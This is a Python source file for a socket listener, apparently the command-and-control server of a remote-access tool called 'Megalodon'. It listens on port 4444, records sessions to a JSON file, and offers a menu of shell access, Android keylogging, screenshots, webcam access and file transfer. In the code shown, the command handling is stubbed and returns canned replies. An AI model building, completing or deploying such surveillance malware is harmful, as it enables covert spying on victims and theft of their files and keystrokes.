import socket
import threading
import time
from datetime import datetime
from pathlib import Path
import json

class Listener:
    
    def __init__(self, ip='0.0.0.0', port=4444):
        self.ip = ip
        self.port = port
        self.socket = None
        self.running = False
        self.clients = []
        self.sessions_file = Path('data/sessions/active.json')
        self.sessions_file.parent.mkdir(parents=True, exist_ok=True)
    
    def start(self):
        self.running = True
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.ip, self.port))
        self.socket.listen(10)
        
        print(f"[+] Listener started on {self.ip}:{self.port}")
        
        while self.running:
            try:
                client, address = self.socket.accept()
                print(f"[+] New connection from {address[0]}:{address[1]}")
                
                client_handler = threading.Thread(target=self.handle_client, args=(client, address))
                client_handler.daemon = True
                client_handler.start()
                
            except Exception as e:
                if self.running:
                    print(f"[-] Listener error: {e}")
    
    def handle_client(self, client, address):
        session_id = f"session_{int(time.time())}"
        
        session_data = {
            'id': session_id,
            'ip': address[0],
            'port': address[1],
            'connected': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat(),
            'commands': 0,
            'status': 'active'
        }
        
        self.clients.append({
            'socket': client,
            'address': address,
            'session': session_data
        })
        
        self.save_session(session_data)
        
        try:
            client.send(b"[+] Connected to Megalodon\n")
            client.send(b"[+] Type 'help' for commands\n")
            
            while True:
                data = client.recv(1024)
                if not data:
                    break
                
                response = self.process_command(data.decode())
                client.send(response.encode())
                
                session_data['last_activity'] = datetime.now().isoformat()
                session_data['commands'] += 1
                self.save_session(session_data)
                
        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            client.close()
            session_data['status'] = 'closed'
            self.save_session(session_data)
            self.clients = [c for c in self.clients if c['socket'] != client]
            print(f"[-] Connection closed: {address[0]}")
    
    def process_command(self, command):
        command = command.strip()
        
        if command == 'help':
            return '''
Available commands:
  help          - Show this help
  shell         - Start interactive shell
  screenshot    - Take screenshot (Android)
  keylog        - Start keylogger (Android)
  webcam        - Access webcam (Android)
  file <path>   - Download file
  upload <path> - Upload file
  exit          - Close connection
'''
        elif command == 'shell':
            return "[*] Shell access granted\n"
        elif command == 'screenshot':
            return "[*] Capturing screenshot...\n"
        elif command == 'exit':
            return "[*] Closing connection...\n"
        else:
            return f"[*] Command '{command}' executed\n"
    
    def save_session(self, session_data):
        try:
            sessions = []
            if self.sessions_file.exists():
                with open(self.sessions_file, 'r') as f:
                    sessions = json.load(f)
            
            for i, s in enumerate(sessions):
                if s['id'] == session_data['id']:
                    sessions[i] = session_data
                    break
            else:
                sessions.append(session_data)
            
            with open(self.sessions_file, 'w') as f:
                json.dump(sessions, f, indent=2)
                
        except Exception as e:
            print(f"[-] Failed to save session: {e}")
    
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
        print("[+] Listener stopped")
    
    def list_sessions(self):
        return self.clients
